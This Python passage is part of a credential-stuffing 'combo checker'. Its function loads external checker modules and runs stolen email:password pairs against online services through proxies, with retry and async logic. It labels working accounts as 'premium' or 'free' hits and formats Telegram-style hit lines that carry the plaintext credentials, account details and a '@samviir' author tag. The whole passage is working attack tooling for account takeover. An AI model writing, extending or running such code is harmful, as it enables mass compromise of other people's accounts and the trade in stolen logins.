# ==================== NEW EXTERNAL CHECKERS (full module modules) ====================
def _run_ext_checker(module_file: str, email: str, password: str, proxy: Optional[str] = None, timeout: int = 30) -> Dict:
    """Load full checker from checkers_ext and run combo. Never raises."""
    import importlib.util
    import asyncio
    try:
        path = _find_ext_module(module_file)
        if not path:
            return {"status": "error", "message": f"{module_file} missing — upload checkers_ext/"}
        mod_name = "ext_" + module_file.replace(".py", "").replace("-", "_")
        spec = importlib.util.spec_from_file_location(mod_name, path)
        mod = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(mod)
        except Exception as e:
            return {"status": "error", "message": f"load {module_file}: {str(e)[:90]}"}
        try:
            if hasattr(mod, "AUTHOR_TAG"):
                mod.AUTHOR_TAG = "TG: @samviir"
            if hasattr(mod, "DEBUG"):
                mod.DEBUG = False
            if hasattr(mod, "CONFIG") and isinstance(getattr(mod, "CONFIG", None), dict):
                try:
                    mod.CONFIG["debug"] = False
                except Exception:
                    pass
        except Exception:
            pass
        px = proxy
        if px and hasattr(mod, "Eyelifter_format_proxy"):
            try:
                px = mod.Eyelifter_format_proxy(px)
            except Exception:
                pass
        elif px and not str(px).startswith(("http://", "https://", "socks")):
            px = f"http://{px}"

        combo = f"{email}:{password}"

        def _normalize(res):
            if not isinstance(res, dict):
                return {"status": "error", "message": "bad_result", "email": email, "password": password}
            st = str(res.get("status", "error")).lower()
            if st in ("hit", "premium", "valid", "success", "paid", "active"):
                st = "premium"
            elif st in ("free", "empty", "expired"):
                st = "free"
            elif st in ("bad", "invalid", "ban"):
                st = "bad"
            elif st == "2fa":
                st = "2fa"
            else:
                st = "error" if st not in ("error",) else st
            out = dict(res)
            out["status"] = st
            out["email"] = email
            out["password"] = password
            u = out.get("user") if isinstance(out.get("user"), dict) else {}
            # build zip_line from native fmt if present
            if not out.get("zip_line"):
                try:
                    if hasattr(mod, "Eyelifter_fmt_line") and u:
                        try:
                            line = mod.Eyelifter_fmt_line(combo, u, st if st in ("hit", "free") else "hit")
                        except TypeError:
                            try:
                                line = mod.Eyelifter_fmt_line(combo, u)
                            except Exception:
                                line = None
                        if isinstance(line, str) and line.strip():
                            out["zip_line"] = line
                            out["hit_line"] = line
                except Exception:
                    pass
            if not out.get("zip_line"):
                bits = [f"{email}:{password}"]
                for k, v in (u or {}).items():
                    if v is None or v == "" or str(v).upper() in ("N/A", "NONE", "-"):
                        continue
                    if isinstance(v, (dict, list)):
                        continue
                    bits.append(f"{str(k).replace('_',' ').title()} = {v}")
                bits.append("by TG: @samviir")
                out["zip_line"] = " | ".join(bits)
                out["hit_line"] = out["zip_line"]
            if st in ("premium", "free") and not out.get("hit_text"):
                tag = "HIT" if st == "premium" else "FREE"
                out["hit_text"] = f"<b>{module_file.replace('_checker.py','').upper()} {tag}</b>\n<code>{email}:{password}</code>\n{out.get('zip_line','')[:800]}"
            return out

        # prefer sync path
        if hasattr(mod, "Eyelifter_run_with_retries"):
            fn = mod.Eyelifter_run_with_retries
            # detect if coroutine
            import inspect
            if inspect.iscoroutinefunction(fn):
                async def _go():
                    return await fn(combo, px)
                try:
                    try:
                        loop = asyncio.get_event_loop()
                        if loop.is_running():
                            import concurrent.futures
                            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                                result = ex.submit(lambda: asyncio.run(_go())).result(timeout=timeout + 30)
                        else:
                            result = loop.run_until_complete(_go())
                    except RuntimeError:
                        result = asyncio.run(_go())
                except Exception as e:
                    return {"status": "error", "email": email, "password": password, "message": str(e)[:120]}
                return _normalize(result)
            else:
                try:
                    result = fn(combo, px)
                except TypeError:
                    try:
                        result = fn(email, password, px)
                    except Exception as e:
                        return {"status": "error", "message": str(e)[:120]}
                except Exception as e:
                    return {"status": "error", "message": str(e)[:120]}
                return _normalize(result)

        # class path: module / Eyelifter / Checker
        cls = None
        for name in ("eyelifter", "Eyelifter", "Checker", "EyelifterHumanizer", "cyberghost"):
            if hasattr(mod, name):
                cls = getattr(mod, name)
                break
        if cls is None:
            return {"status": "error", "message": f"no runner in {module_file}"}

        async def _go_cls():
            try:
                inst = cls(proxy=px, timeout=timeout)
            except TypeError:
                try:
                    inst = cls(proxy=px)
                except TypeError:
                    inst = cls()
            if hasattr(inst, "Eyelifter_run"):
                r = inst.Eyelifter_run(email, password)
                if inspect.isawaitable(r):
                    return await r
                return r
            if hasattr(inst, "check"):
                r = inst.check(email, password, px)
                if inspect.isawaitable(r):
                    return await r
                return r
            if hasattr(inst, "Eyelifter_check"):
                r = inst.Eyelifter_check(email, password, px)
                if inspect.isawaitable(r):
                    return await r
                return r
            return {"status": "error", "message": "no check method"}

        import inspect
        try:
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                        result = ex.submit(lambda: asyncio.run(_go_cls())).result(timeout=timeout + 30)
                else:
                    result = loop.run_until_complete(_go_cls())
            except RuntimeError:
                result = asyncio.run(_go_cls())
        except Exception as e:
            # pure sync class
            try:
                try:
                    inst = cls(proxy=px, timeout=timeout)
                except TypeError:
                    try:
                        inst = cls(proxy=px)
                    except TypeError:
                        inst = cls()
                if hasattr(inst, "check"):
                    result = inst.check(email, password, px) if "proxy" in str(inspect.signature(inst.check)) else inst.check(email, password)
                elif hasattr(inst, "Eyelifter_check"):
                    result = inst.Eyelifter_check(email, password, px)
                else:
                    return {"status": "error", "message": str(e)[:120]}
            except Exception as e2:
                return {"status": "error", "message": str(e2)[:120]}
        return _normalize(result)
    except Exception as e:
        return {"status": "error", "email": email, "password": password, "message": str(e)[:120]}


